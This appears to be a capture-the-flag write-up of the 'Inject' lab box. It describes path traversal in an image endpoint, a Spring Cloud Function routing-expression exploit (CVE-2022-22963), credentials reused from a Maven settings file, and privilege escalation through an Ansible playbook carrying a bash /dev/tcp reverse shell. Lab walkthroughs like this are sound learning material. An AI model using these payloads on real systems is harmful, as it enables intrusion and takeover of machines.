# inject

## nmap scan

$ nmap -sC -sV -o nmap/initial.nmap $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 16:45 EST
Nmap scan report for 10.129.201.13
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
| http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds

* 22 - ssh - Ubuntu
* 8080 - nagios-nsca - I'm not sure what this service type is, but this is a web server


## http

This web application only has one function and its uploading files. The upload filter is bypassable, but all my attempts at uploading a reverse shell have failed to execute.

Issuing the GET request in CURL returns a verbose error message revealing the path of the directory that the /show_image?img=x is pulling images from. So that tells us how far back we need to go to access other directories

```bash
$ curl 10.129.248.49:8080/show_image?img=/etc/passwd                                                              
{"timestamp":"2023-04-11T22:37:34.639+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/
www/WebApp/src/main/uploads/etc/passwd] cannot be resolved in the file system for checking its content length","path
":"/show_image"}
```
By requesting curl 10.129.248.49:8080/show_image?img=../../../../../../../etc/passwd we can retreive the /etc/passwd file and now we can go diggin for important files that reveal information about the configuration of services on the box.

For some reason we can list directory contents by just listing the path. I'm not sure why this happens, but I'll come back to it when I own the box later on. From this we can see files used for the web server.

inside of pom.xml we can see the dependencies required for this application and searching these with their versions is a good way to find vulnerabilities in the application.

And this one is vulnerable to CVE-2022-22963
``
    <dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
    </dependency>
``

## CVE-2022-22963

This cve exploits a flaw in the Spring Cloud Function via the spring.cloud.function.routing-expression header that allows. This header can be used with T(java.lang.Runtime).getRuntime().exec("code here") for remote code execution.
In my attempts using online POC's they all had arbitrary directories in a POST request, but this wasn't taking for me. I found that **/functionRouter** returned the expected response and successfully executed the code server side.

request:
``
POST /functionRouter HTTP/1.1
Host: 10.129.248.147:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 5 10.10.14.142")
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

asd
``
> now to get a reverse shell...


## Reverse shell

* able to create files with touch
* unable to use redirection to write to files
* able to use curl & wget

**uploaded with wget; executed with bash /tmp/script.sh**
And we get our initial foothold with frank

## PE

> .m2 hidden directory inside of /home/frank
> settings.xml file hold Phils creds:
```xml
frank@inject:~/.m2$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

We can use phils password to move laterally to Phil.

## PE - 2

> user flag: 3ae76d06d7dff6c017fd2fb748cd9ebe

The user phil is in the group staff

```bash
$ groups
phil staff
```
After seeing this uncommon group, we want to search for what the group has permissions to, which we do with a find command:

```bash
$ find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
```
Inside of the /opt/automation/tasks directory is a ansible yaml playbook which is used to automate configurating services with ansible.

> ansible aside rq

> ansible is an open-source automation tool used for configuration management, application deployement, and infrastructure provisioning. It's based on the concept of **infrastructure as code**, which is the concept that code should be written to define how infrastructure is setup (database, server, etc.). Ansible uses yaml playbooks to configure and deploy applications. 

Now that we know the file used to deploy the webapp, we just need to make a playbook that will call a reverse shell and we should get root. Or so I thought. Instead of overwriting the file, we just need to make another playbook. Which means that ansible must be pulling all playbooks from the directory. WE used the same naming scheme and our reverse shell connected!

reverse shell playbook:
```yaml
- hosts: localhost
  tasks:
  - name: reverse shell execution
    ansible.builtin.shell: 


      cmd: bash -c 'bash -i >& /dev/tcp/10.10.14.142/9999 0>&1'
```
We get our root flag, but I am going to poke around a bit more to see how ansible was configured to use the entire directory.

root has two cronjobs running every two minutes:
* run all yml playbooks with ansible every 2 minutes
* refresh the playbooks directory with the playbook_1.yml file
```bash
*/2 * * * * /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml                                              │rectory.
*/2 * * * * sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/t│
asks/
```

This box taught me about ansible and how it uses playbooks to configure and deploys services. It also taught me to keep trying harder on web vulns, because I had given up on the lfi or looked past it because of the juicy file upload.
